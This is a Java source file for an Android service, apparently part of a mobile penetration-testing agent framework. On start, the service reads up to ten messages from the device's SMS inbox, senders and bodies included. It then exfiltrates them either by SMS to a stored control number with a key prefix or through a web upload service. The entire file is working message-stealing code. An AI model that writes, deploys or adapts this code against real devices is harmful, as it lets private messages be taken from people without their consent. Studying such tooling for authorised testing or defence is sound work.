package com.bulbsecurity.framework;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;


public class SMSGet extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		String sms = "SMS";
		String web = "WEB";
		String ret = intent.getStringExtra("returnmethod");
		Uri uri = Uri.parse("content://sms/inbox");
		Cursor c = getContentResolver().query(uri, null, null, null, null);
		String smss = "SMS:";
		int count = 10;
		if (c.getCount() <= 10)
		{
			count = c.getCount();
		}
		String[] body = new String[c.getCount()];
		String[] number = new String[c.getCount()];                
		if(c.moveToFirst()){
			for(int i=0;i<count;i++){
			   body[i]= c.getString(c.getColumnIndexOrThrow("body")).toString();
			   number[i]=c.getString(c.getColumnIndexOrThrow("address")).toString();
			   String concat = number[i].concat(":");
			   String concat2 = concat.concat(body[i]);
			   concat2 = concat2.concat(";");
			   smss = smss.concat(concat2);
			   c.moveToNext();
	         }
		}
		c.close();
		if (ret != null)
		{
			 
			if (ret.equals(sms))
			{

		        
				Intent intent3 = new Intent(getApplicationContext(),SMSService.class);
				//String number2 = ((AndroidAgent)this.getApplication()).getcontrolNumber();
				//String key = ((AndroidAgent)this.getApplication()).getkey();
				String key = getApplicationContext().getResources().getString(R.string.key);
				String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
				String first = key.concat(" ");
				String smsss = first.concat(smss);
				intent3.putExtra("number", number2);
				intent3.putExtra("message", smsss);
				Context context = getApplicationContext();
				context.startService(intent3);
				
			}
			else if (ret.equals(web))
			{
				Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
				intent2.putExtra("uploadstring", smss);
				Context context = getApplicationContext();
				context.startService(intent2);
			}
			
		}
	}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
